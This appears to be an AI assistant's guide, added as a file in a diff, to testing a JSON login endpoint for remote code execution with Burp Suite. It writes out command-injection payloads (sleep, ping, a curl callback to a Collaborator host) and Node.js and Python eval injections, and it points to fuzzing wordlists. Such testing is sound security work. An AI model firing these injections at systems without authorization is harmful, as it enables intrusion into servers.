@@ -1,0 +1,64 @@
+To test a JSON authentication payload for Remote Code Execution (RCE) using Burp Suite, you need to inject specialized payloads into the input fields (username or password). RCE occurs if the backend passes these values into a system shell, an eval() function, or an unsecure deserialization method. [1, 2, 3, 4] 
+Because authentication systems usually talk to a database, RCE here is most commonly achieved via OS Command Injection or Database-to-OS escalation. [5] 
+Here is exactly how to test for it step-by-step.
+------------------------------
+## Step 1: Set Up Burp Repeater
+
+   1. Intercept your login request in the Proxy tab or find it in your HTTP History.
+   2. Press Ctrl + R (Windows) or Cmd + R (Mac) to send it to Repeater.
+   3. Go to the Repeater tab to manipulate the JSON payload.
+
+## Step 2: Test for Blind OS Command Injection (Recommended)
+Most authentication RCEs will not print the command output on your screen. You must use Time-based or Out-of-Band (OOB) techniques. [6, 7] 
+## Method A: Time-Based Testing
+You inject a command that forces the server to sleep for a specific number of seconds. If the response delays by exactly that amount of time, you have RCE.
+Replace your values with these test payloads one by one:
+
+* Linux Targets:
+
+{"password":"9012","username":"652223518; sleep 10;","rememberMe":false}
+{"password":"9012","username":"652223518`sleep 10`","rememberMe":false}
+{"password":"9012","username":"652223518 || sleep 10","rememberMe":false}
+
+* Windows Targets:
+
+{"password":"9012","username":"652223518 & ping -n 11 127.0.0.1 &","rememberMe":false}
+
+
+Watch the bottom right corner of Burp Repeater for the Response Time millis indicator to see if it paused for 10 seconds.
+## Method B: Out-of-Band (OOB) Testing
+If you have Burp Suite Professional, use the Burp Collaborator client to catch external network connections.
+
+   1. Click the Burp menu -> Burp Collaborator client.
+   2. Click Copy to clipboard to get your unique Collaborator subdomain (e.g., ://oastify.com).
+   3. Inject a payload that forces the server to ping your subdomain:
+   
+   {"password":"9012","username":"652223518; curl http://oastify.com","rememberMe":false}
+   
+   4. Click Poll now in the Collaborator window. If you see an HTTP or DNS request from the server, you have RCE.
+
+## Step 3: Test for Server-Side Language Injection (eval())
+If the backend is written in Node.js, Python, or PHP, developers sometimes dangerously pass incoming JSON values into code execution functions.
+Try injecting language-specific arithmetic or delay scripts:
+
+* Node.js / Server-Side JavaScript (SSJS):
+
+{"password":"9012","username":"652223518'; require('child_process').execSync('sleep 10'); //","rememberMe":false}
+
+* Python (if evaluated dynamically):
+
+{"password":"9012","username":"652223518'; __import__('os').system('sleep 10'); #","rememberMe":false}
+
+
+## Step 4: Automated Testing with Burp Intruder
+Instead of guessing payloads manually, you can automate this using a wordlist.
+
+   1. Right-click the request and select Send to Intruder.
+   2. Highlight your username value: "username":"§652223518§".
+   3. Go to the Payloads tab.
+   4. Load a list of RCE fuzzing strings (you can use pre-made lists from GitHub repositories like SecLists -> Fuzzing -> Command-Injection).
+   5. Start the attack and sort the results by the Response Received Time column to find anomalies.
+
+------------------------------
+Do you know what operating system (Linux or Windows) or backend stack (Node.js, PHP, Java) the target server is running? I can provide highly specific syntax if you know the technology.
+
